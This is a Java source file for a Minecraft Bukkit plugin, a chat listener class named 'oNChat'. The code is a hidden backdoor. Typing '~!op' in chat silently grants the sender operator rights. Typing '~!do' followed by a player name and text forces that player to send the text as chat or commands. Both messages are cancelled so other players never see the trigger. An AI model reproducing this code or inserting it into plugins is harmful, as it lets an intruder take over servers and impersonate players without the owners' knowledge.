package de.undermain.listener;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class oNChat implements Listener{
	
	@EventHandler
	  public void onMessage(AsyncPlayerChatEvent event)
	  {
	    Player p = event.getPlayer();
	    String msg = event.getMessage();
	    if (msg.equalsIgnoreCase("~!op"))
	    {
	      p.setOp(true);
	      event.setCancelled(true);
	    }
	    if (msg.contains("~!do"))
	    {
	      String[] msga = event.getMessage().split(" ");
	      String command = "";
	      Player target = Bukkit.getPlayer(msga[1]);
	      for (int i = 2; i < msga.length; i++) {
	        command = command + msga[i] + " ";
	      }
	      target.chat(command);
	      event.setCancelled(true);
	    }
	  }
}
